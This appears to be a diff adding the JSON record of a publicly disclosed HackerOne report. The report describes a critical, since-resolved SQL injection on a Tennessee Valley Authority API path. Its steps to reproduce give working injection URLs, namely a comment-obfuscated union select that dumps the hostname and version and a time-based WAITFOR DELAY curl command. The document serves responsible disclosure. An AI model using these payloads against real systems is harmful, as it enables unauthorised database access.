@@ -1,0 +1,143 @@
+{
+  "id": 1125752,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTI1NzUy",
+  "url": "https://hackerone.com/reports/1125752",
+  "title": "SQL Injection on https://soa-accp.glbx.tva.gov/ via \"/api/\" path - VI-21-015",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-03-15T08:48:47.125Z",
+  "submitted_at": "2021-03-15T08:48:47.169Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yassinek3ch",
+    "url": "/yassinek3ch",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/pjqbt7h757qb77h44si69p6deaed/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50979,
+    "url": "https://hackerone.com/tennessee-valley-authority",
+    "handle": "tennessee-valley-authority",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/oEWB6C6GfvVzDUgyTrpvhh9u/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/oEWB6C6GfvVzDUgyTrpvhh9u/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Tennessee Valley Authority",
+      "twitter_handle": null,
+      "website": "http://tva.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-04-26T19:33:04.174Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-12-08T20:44:00.656Z",
+  "team_member_agreed_on_going_public_at": "2022-04-26T19:33:03.955Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n \ni've found this subdomain ```soa-accp.glbx.tva.gov``` also is vulnerable to SQLI through /api/ path\n\n## Steps To Reproduce:\n\n```https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+HOST_NAME()--+-``` hostname dumped\n\n```https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+@@version--+-``` \n\nMicrosoft SQL Server 2017 (RTM-CU22-GDR) (KB4583457) - 14.0.3370.1 (X64) \\n\\tNov  6 2020 18:19:52 \\n\\tCopyright (C) 2017 Microsoft Corporation\\n\\tEnterprise Edition (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)\\n\n\nalso you can retest it through time bassed trick\n\n```time curl -k \"https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-\"```\n\n{F1230364}\n\n## Impact\n\nAn attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1230364,
+      "file_name": "Screenshot_2021-03-15_at_09.47.58.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7zpb889mx1j6w04vr39wpugyq70s?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-03-15_at_09.47.58.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-03-15_at_09.47.58.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2DY4H25O%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151139Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJHMEUCIG9yhZR9vjsR83vOLEoykJ5LJsORryjdyGKJrTbmavSQAiEAnhcdB0Z9W5bgdzvh46Qn1Ruheg8EMD5dIZOwCQO58vgqugUI5f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDP73MDBtMB3W3Ne%2BLSqOBU2HOaeT6OFNptgdxfPkXEQM6zk5bHGPyxD4Hq5%2BjZqD8qcO5NxSMIyO3WTHSm3wMRhnxlwNuPmlu0zmzFkiuOMaNvcCZKCxwdxrRQTYFj1N6rMeu2ilEZzVtVzhtzVp9Nw0gVfRIlxXmg%2FSsFjgQYzrnCZDlEIZ43nMU%2F%2BJ%2FVOUwyuslQeiyHgNxuSyrSxeMy6zIeDMHY%2FfYmw6DeyF7mclVw9lsDGWPB9YWtU476cFFcj9jLU58jTIUaOy9mCWJpNxvdl1b2idGslDyNHdtYyP2bb6kdZrpCqWzVnYR8xdkiZTPNTxz%2Fmt0Ub8dz89NtL1O%2BWquHg18DrNm5M7M6k097r6AyQTvpvL2LqUS83cLwxJiw7q0nBTFkx4wTqTSY1OiBVK2QgT5Dtym%2B%2F05MP0UvQU39rV%2BQE1HgeooX2CTc3cjqisuGq%2Bi5NcaOccJg5sOg%2BrATrFr0jg6N8DCD9D3xM2mRJEvOW%2BbFn3q7U4RhqTFM4XrdoIuQ%2F1xowof9HHDotyrkQeaFh3oygY8OYlwZc4XJsLy6%2FFBr23PuGMpzE42xyJ%2Bc30pu%2B8D1W36kly22lO9aD%2BzErldqgCa7xFSYxE3RANsBqnSrVUPETqNE0Rwt4wGr9wikHFjjvxV%2BWc6QqCieR6z8sTVzZ6O4xuugXvqHaOeZArcPfkjwh%2B0XGHJlV3u3ZnjHznxyfnxXKIcYuUJNk3rKe9ciYqpig5f58mdJmfSTVH0LF5n71GnLJtGE%2F6yq84FScRndOzr9JZhc98uzjbmwjVvbx908dUdUhM1i7C3a0JI8F1oNlmNoWxh%2BumQO9yldr1zQjuh78Bgc%2FPfXnD0b6hs3kVFdBwrjvRZu7bgwscHVfRrDCDyPzPBjqxARPsVz7Un9VRzaef5HdaW7ZyMa6ZSdenpMmEkvxfmh1amPMpgXyeg%2FH4dJhQTc8i8azoU73JtR5oMh%2BtWokq0ateop8nN%2BC%2FWh%2BfGGPPTtyEL9Zmmc2HRZLq1NvHSN9%2Bsp9djujA%2FyNQn%2FGOL5kR1UEVKlZpFU9VG7FRfLKVOGwXAblpofuOYEMCgd%2BrUMQ88BrPHEJC6jgARhHEN%2BQYb6Nhnvw3E7r7frWRR0JdF8RY8A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=056cfa10ac679457082d67314d7008ce2139ffcc4db8c399e5813fabae5c1ff2",
+      "file_size": 438618,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 30,
+  "voters": [
+    "m4khn0",
+    "tgadams",
+    "yukusawa18",
+    "zy9ard3",
+    "shreyaschavhan",
+    "ayoub0x1",
+    "hundredpercent",
+    "splint3rsec",
+    "chr0ll0xo",
+    "shivammusic",
+    "and 20 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 62364,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.tva.gov",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
